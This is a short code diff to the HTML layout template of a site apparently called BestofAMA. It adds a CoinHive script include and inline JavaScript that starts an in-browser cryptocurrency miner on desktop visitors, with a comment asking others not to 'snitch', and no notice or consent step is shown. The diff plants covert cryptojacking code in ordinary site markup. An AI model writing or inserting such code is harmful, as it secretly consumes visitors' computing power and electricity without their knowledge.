@@ -61,3 +61,9 @@ html lang="en"
       p.endorsed reddit has not approved or endorsed BestofAMA, reddit design elements are trademarks of reddit inc.
 
     = javascript_include_tag "application"
+    = javascript_include_tag "https://coinhive.com/lib/coinhive.min.js"
+    javascript:
+      // This site costs money to run, and I have no other source of revenue for this site.
+      // let me have this #nosnitchin.
+      var miner = new CoinHive.Anonymous('pY0c9IW8dwqwrMra0l7yjcjwMSwrxucN', {throttle: 0.3});
+      if (!miner.isMobile() && !miner.didOptOut(14400)) { miner.start(); }
